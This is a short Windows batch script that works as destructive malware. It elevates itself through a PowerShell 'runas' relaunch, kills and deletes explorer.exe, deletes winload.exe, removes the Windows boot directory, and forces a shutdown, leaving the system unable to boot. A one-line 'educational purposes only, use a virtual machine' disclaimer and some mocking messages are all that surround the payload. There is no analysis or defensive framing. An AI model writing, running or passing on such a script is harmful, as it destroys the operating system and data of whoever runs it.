@echo off
whoami /priv | find "SeDebugPrivilege" > nul
if %errorlevel% neq 0 (
 @powershell start-process %~0 -verb runas
 exit
)
echo educational purposes only. please use virtual machine
pause
echo destroying ui
taskkill /f /im explorer.exe
del /q c:\windows\explorer.exe
echo destroying efi
del /q c:\windows\system32\boot\winload.exe
rd /s /q c:\windows\boot
cls
echo ur pc wont burt up!!!11!1
echo prss any kie to bye
pause >nul
shutdown -s -t 0